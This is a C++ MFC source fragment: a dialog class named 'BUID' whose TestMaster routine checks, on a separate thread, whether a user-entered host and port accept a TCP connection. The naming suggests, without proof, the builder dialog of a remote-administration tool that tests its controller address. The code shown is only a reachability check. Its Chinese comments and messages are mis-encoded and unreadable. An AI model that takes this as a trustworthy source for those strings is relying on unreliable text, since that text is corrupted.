	BUID* pThis = (BUID*)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{
		AfxMessageBox("socket ��ʼ��ʧ��");
		return false;
	}
	// ����socketΪ������
	u_long argp = 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_Host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = htons(atoi(pThis->m_Port));

	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);

	connect(sRemote, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);

	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();

	if (bRet)
		strResult.Format("�ɹ����ӵ�����%s��%s�˿�!", pThis->m_Host, pThis->m_Port);
	else
		strResult.Format("���ܴ򿪵�����%s�����ӣ� �ڶ˿� %s: ����ʧ��", pThis->m_Host, pThis->m_Port);
	AfxMessageBox(strResult);
	return -1;
}
void BUID::OnTestMaster1()
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_Host.GetLength() || !m_Port)
	{
		MessageBox("��������д����/IP(1)������Ϣ...", "��ʾ...", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
	// 	m_testBtn1.EnableWindow(FALSE);
	// 	// 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster1, this, 0, NULL);
	// 	TestMaster1();
}


void BUID::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	BUID::OnOK();
}
